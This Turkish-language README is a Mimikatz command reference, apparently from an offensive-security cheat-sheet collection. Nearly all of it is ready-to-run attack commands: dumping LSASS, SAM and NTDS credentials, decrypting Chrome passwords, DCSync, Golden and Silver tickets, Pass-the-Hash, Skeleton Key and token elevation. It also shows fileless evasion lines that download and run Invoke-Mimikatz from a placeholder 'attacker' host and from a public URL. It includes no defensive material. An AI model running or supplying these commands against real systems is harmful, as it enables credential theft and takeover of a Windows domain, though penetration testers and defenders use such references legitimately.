# 🔑 Mimikatz - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
             Windows Kimlik Bilgisi Çıkarma Aracı
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 Windows işletim sistemlerinde en güçlü kimlik bilgisi ve hash çıkarma aracı</b>
</p>

---

## 📋 İçindekiler

- [Mimikatz Nedir?](#-mimikatz-nedir)
- [Başlarken ve Ön Gereksinimler](#-başlarken-ve-ön-gereksinimler)
- [Çalıştırma Yöntemleri](#-çalıştırma-yöntemleri)
- [Temel Modüller](#-temel-modüller)
- [Kimlik Bilgisi Çıkarma](#-kimlik-bilgisi-çıkarma)
- [Kerberos Saldırıları](#-kerberos-saldırıları)
- [İleri Düzey Saldırılar](#-i̇leri-düzey-saldırılar)
- [Atlatma Teknikleri (Evasion)](#-atlatma-teknikleri-evasion)
- [Hızlı Başvuru](#-hızlı-başvuru)

---

## 🎯 Mimikatz Nedir?

**Mimikatz**, Benjamin Delpy (@gentilkiwi) tarafından C diliyle geliştirilmiş efsanevi bir istismar sonrası (post-exploitation) aracıdır. Windows bellek yapısından ve yerel veritabanlarından şu verileri çıkarabilir:

- 🔑 **Düz Metin Parolalar** - Windows belleğinden (LSASS süreci)
- 🎫 **Kerberos Biletleri** - TGT ve TGS biletleri
- 🔐 **NTLM Hashleri** - SAM veritabanı veya NTDS.dit dosyasından
- 📜 **Sertifikalar** ve özel anahtarlar (CryptoAPI)
- 🗝️ **Önbelleğe Alınmış Kimlik Bilgileri** (DCC2)
- 🔒 **DPAPI Gizli Verileri** ve şifrelenmiş anahtarlar

### Neden Bu Kadar Önemli?

| Kullanım Alanı | Açıklama |
|----------------|----------|
| **Kimlik Bilgisi Hırsızlığı** | Bellekten açık parolaları ve hashleri çekme |
| **Yanal Hareket (Lateral Movement)** | Pass-the-Hash, Pass-the-Ticket saldırıları |
| **Yetki Yükseltme** | Belirteç (token) manipülasyonu ile SYSTEM veya Admin taklidi |
| **Kalıcılık (Persistence)** | Golden ve Silver Ticket oluşturma |
| **Etki Alanı Hakimiyeti** | DCSync ile tüm Active Directory veritabanını ele geçirme |

---

## 🚀 Başlarken ve Ön Gereksinimler

### İndirme

```bash
# Resmi GitHub deposu
git clone https://github.com/gentilkiwi/mimikatz.git

# Derlenmiş ikili dosyalar (Releases sayfası)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Ön Gereksinimler

- **Administrator / SYSTEM** yetkisi (çoğu modül için şarttır)
- **SeDebugPrivilege** yetkisi (LSASS belleğini okuyabilmek için)
- Windows x64 veya x86 mimarisi

### İlk Komutlar

```cmd
# Mimikatz'ı başlatın
mimikatz.exe

# Hata ayıklama ayrıcalığını etkinleştirin
mimikatz # privilege::debug
Privilege '20' OK

# SYSTEM yetkisine yükselin
mimikatz # token::elevate

# Çıkış yapın
mimikatz # exit
```

---

## 💻 Çalıştırma Yöntemleri

### 1. Bağımsız İkili Dosya (Standalone Binary)

```cmd
# Doğrudan çalıştırma (AV/EDR tarafından hızla tespit edilebilir)
mimikatz.exe

# Tek satırda komut zincirleme
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Çıktıyı dosyaya yönlendirme
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Mimikatz log komutu ile
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Dosyasız (fileless) bellek içi yürütme
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Kimlik bilgilerini dökme
Invoke-Mimikatz -DumpCreds

# Sertifikaları dışa aktarma
Invoke-Mimikatz -DumpCerts

# Uzak makinede çalıştırma
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi Eklentisi)

```bash
# Meterpreter oturumunda
meterpreter > load kiwi

# Yardım menüsü
meterpreter > help kiwi

# Tüm kimlik bilgilerini dök
meterpreter > creds_all

# SAM veritabanını dök
meterpreter > lsa_dump_sam

# LSA sırlarını dök
meterpreter > lsa_dump_secrets

# Kerberos biletleri listele ve kullan
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec ile Kullanım

```bash
# SAM veritabanını dökme
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# LSA sırlarını dökme
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Domain Controller üzerinde NTDS.dit dökme
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. Bellek Döküm Dosyasından (Memory Dump)

```cmd
# LSASS sürecini Task Manager veya procdump ile dökün
procdump.exe -ma lsass.exe lsass.dmp

# Döküm dosyasını mimikatz'a yükleyip offline analiz edin
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 🔧 Temel Modüller

### Modüllere Genel Bakış

| Modül | Açıklama |
|-------|----------|
| **sekurlsa** | LSASS bellek alanından kimlik bilgilerini çıkarır |
| **lsadump** | SAM, NTDS, LSA sırları ve önbellek hashlerini döker |
| **kerberos** | Kerberos bilet manipülasyonu ve sahte bilet üretimi |
| **crypto** | Windows CryptoAPI sertifika ve özel anahtarları |
| **vault** | Windows Kimlik Bilgisi Yöneticisi (Credential Manager) |
| **token** | Windows erişim belirteci (token) manipülasyonu |
| **privilege** | İşlem ayrıcalıklarını etkinleştirme |
| **process** | Süreç yönetimi ve ayrıcalık denetimi |
| **service** | Windows servis manipülasyonu |
| **dpapi** | DPAPI anahtarları ve şifreli veriler |
| **misc** | Çeşitli yardımcı komutlar (Skeleton Key vb.) |

---

## 🔐 Kimlik Bilgisi Çıkarma

### sekurlsa Modülü (LSASS Belleği)

```cmd
# Önce debug yetkisini etkinleştirin!
mimikatz # privilege::debug

# Bellekteki tüm oturum parolalarını dök (Düz metin, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Yalnızca NTLM hashlerini dök
mimikatz # sekurlsa::msv

# Kerberos biletlerini dök
mimikatz # sekurlsa::tickets

# WDigest kimlik bilgilerini dök (Düz metin parola ifşası)
mimikatz # sekurlsa::wdigest

# Kerberos şifreleme anahtarlarını dök
mimikatz # sekurlsa::ekeys

# DPAPI anahtarlarını dök
mimikatz # sekurlsa::dpapi

# RDP kimlik bilgilerini dök (TsPkg)
mimikatz # sekurlsa::tspkg

# Azure AD / CloudAP kimlik bilgilerini dök
mimikatz # sekurlsa::cloudap
```

### lsadump Modülü (SAM / NTDS / Secrets)

```cmd
# SAM veritabanını dök (Yerel hesaplar)
mimikatz # lsadump::sam

# Çevrimdışı kaydedilmiş kovan dosyalarından SAM dökümü
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# LSA sırlarını dök (Servis hesapları, VPN parolaları)
mimikatz # lsadump::secrets

# Önbelleğe alınmış etki alanı kimlik bilgilerini dök (DCC2)
mimikatz # lsadump::cache

# DCSync saldırısı (Belirli bir kullanıcının hashini etki alanı denetleyicisinden çekme)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Domain Controller üzerinde NTDS.dit belleğini yamalama
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Güven ilişkisi anahtarlarını dök
mimikatz # lsadump::trust /patch
```

### vault ve dpapi Modülleri

```cmd
# Vault kimlik bilgilerini listele ve dök
mimikatz # vault::list
mimikatz # vault::cred /patch

# DPAPI ana anahtarlarını (masterkeys) çıkar
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Google Chrome kayıtlı parolalarını çöz
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 🎫 Kerberos Saldırıları

### Biletleri İnceleme ve Dışa Aktarma

```cmd
# Mevcut biletleri listele
mimikatz # kerberos::list

# Biletleri ayrıntılı listele ve .kirbi olarak dışa aktar
mimikatz # kerberos::list /export
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT - Bilet Enjeksiyonu)

```cmd
# Bellekteki mevcut biletleri temizle
mimikatz # kerberos::purge

# .kirbi bilet dosyasını oturuma yükle
mimikatz # kerberos::ptt ticket.kirbi

# Biletin yüklendiğini doğrula
mimikatz # kerberos::list
```

### Golden Ticket (Altın Bilet Saldırısı)

```cmd
# Gereksinimler:
# - Domain adı (domain.local)
# - Domain SID (S-1-5-21-...)
# - krbtgt hesabının NTLM hashi
# - Hedef kullanıcı adı

# Altın bilet oluştur ve mevcut oturuma uygula (/ptt)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Bileti dosyaya kaydet
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Özel yetkili grupları tanımlayarak altın bilet üretme (RID 512 = Domain Admins)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt
```

### Silver Ticket (Gümüş Bilet Saldırısı)

```cmd
# CIFS (Dosya Paylaşımı) için Gümüş Bilet
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# HTTP (Web Servisleri) için Gümüş Bilet
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# MSSQL Veritabanı için Gümüş Bilet
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# WinRM / PowerShell Uzak Oturum için Gümüş Bilet
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

## 💀 İleri Düzey Saldırılar

### Pass-the-Hash (PtH)

```cmd
# NTLM hash ile yeni bir cmd oturumu başlatma
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# AES anahtarı ile başlatma
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe
```

### DCSync Saldırısı

```cmd
# Belirli bir kullanıcının kimlik bilgilerini DC replikasyonu ile çek
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# krbtgt hashini çek (Altın bilet oluşturmak için)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Tüm etki alanı kullanıcılarını CSV formatında dök
mimikatz # lsadump::dcsync /domain:domain.local /all /csv
```

### Skeleton Key Saldırısı

```cmd
# DC üzerindeki LSASS belleğine anahtar enjekte et
mimikatz # misc::skeleton

# Artık etki alanındaki tüm kullanıcılar kendi parolalarının yanı sıra
# "mimikatz" parolasıyla da oturum açabilir (DC yeniden başlayana kadar geçerlidir)
```

### Belirteç (Token) Manipülasyonu

```cmd
# Kullanılabilir belirteçleri listele
mimikatz # token::list

# SYSTEM belirtecine yüksel
mimikatz # token::elevate

# Belirli bir kullanıcının belirtecine geç
mimikatz # token::elevate /user:Administrator

# Orijinal belirtece geri dön
mimikatz # token::revert
```

---

## 🛡️ Atlatma Teknikleri (Evasion)

### Dosyasız (Fileless) ve Bellek İçi Yürütme

```powershell
# PowerShell üzerinden doğrudan bellekten çalıştırma
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz
```

### Alternatif LSASS Döküm Yöntemleri

```cmd
# Microsoft imzalı Procdump kullanımı
procdump.exe -ma lsass.exe lsass.dmp

# Yerleşik Windows comsvcs.dll kütüphanesi ile döküm
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Görev Yöneticisi (Task Manager) ile
# lsass.exe üzerine sağ tık > Create dump file
```

---

## 📊 Hızlı Başvuru

### Önemli Tek Satırlık Komutlar

```cmd
# Tüm oturum parolalarını dök
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# SAM veritabanını dök
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync ile krbtgt hashini çek
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"

# Pass-the-Hash uygula
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Temel Komut Özeti

| Komut | Açıklama |
|-------|----------|
| `privilege::debug` | Hata ayıklama ayrıcalığını etkinleştir |
| `token::elevate` | SYSTEM belirtecine yüksel |
| `sekurlsa::logonpasswords` | LSASS'taki tüm parolaları dök |
| `sekurlsa::msv` | NTLM hashlerini dök |
| `sekurlsa::pth` | Pass-the-Hash çalıştır |
| `lsadump::sam` | Yerel SAM veritabanını dök |
| `lsadump::dcsync` | DCSync ile hesapları çek |
| `kerberos::ptt` | Kerberos biletini enjekte et |
| `kerberos::golden` | Altın veya gümüş bilet üret |

---

## 📚 Kaynaklar

- [Resmi Mimikatz GitHub Deposu](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity Mimikatz Rehberi](https://adsecurity.org/?page_id=1821)
- [HackTricks Mimikatz Dokümantasyonu](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### İlgili Kılavuzlar
- [Windows Yetki Yükseltme](../../Windows-PrivEsc/translations/README.tr.md)
- [Active Directory Metodolojisi](../../AD-Attack-Methodology/translations/README.tr.md)
- [Metasploit](../../Metasploit/translations/README.tr.md)

---

<p align="center">
  <b>🔑 Windows Kimlik Bilgisi Saldırılarında Ustalaşın!</b><br>
  <i>Mimikatz - Windows sistemlerinde yetki ve parola yönetiminin anahtarı</i>
</p>
